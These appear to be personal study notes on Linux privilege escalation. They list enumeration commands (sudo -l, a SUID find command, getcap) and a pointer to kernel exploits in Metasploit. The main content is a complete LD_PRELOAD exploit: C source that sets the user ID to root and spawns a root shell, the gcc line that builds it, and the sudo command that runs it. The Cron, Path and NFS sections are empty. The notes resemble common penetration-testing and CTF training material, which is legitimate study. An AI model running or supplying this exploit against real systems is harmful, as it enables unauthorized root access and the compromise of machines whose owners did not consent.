
## Kernel exploits
Metasploit has exploits that allow privileged escalation.
- Find the kernel version using **uname -r**
- Search for an exploit that works for the kernel version
- Run the exploit 

## Common
All based on ```https://gtfobins.org/```

- **Sudo** 
    - *You can see what sudo permissions you have available with* **sudo -l** 
- **UID**
    - *you can use* **find / -type f -perm -04000 -ls 2>/dev/null** *to find files UID or SGID bits set.*
- **Capabilities** 
    -  *you can use* **getcap -r / 2>/dev/null** *to find binaries with Linux capabilities that may allow elevated or specialized privileges.*



### LD_PRELOAD
Using **sudo -l** you an option may be avaiable called ```env_keep+=LD_PRELOAD``` which is another possible priviledge escalation method.


Name *Exploit.c*
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");  // Prevent recursive loading
    setgid(0);               // Set group ID to root
    setuid(0);               // Set user ID to root
    system("/bin/bash");     // Spawn a root shell
}
```
Complie this text as a shared extension
**gcc -fPIC -shared -o Exploit.so Exploit.c -nostartfiles** 

- *fPIC	Generates Position-Independent Code required for shared libraries.*
- *-shared	compiles to a shared object .so*
- *-o Exploit.so    |    output filename.*
- *Exploit.c    |    input file.*
- *nostartfiles	Prevents standard startup routines so _init() executes immediately.*

**Finnaly** ```sudo LD_PRELOAD=./Exploit.so <allowed_binary>```
*Allowed binary = What commands you have access to in sudo -l





## Crone jobs





## Path





## NFS
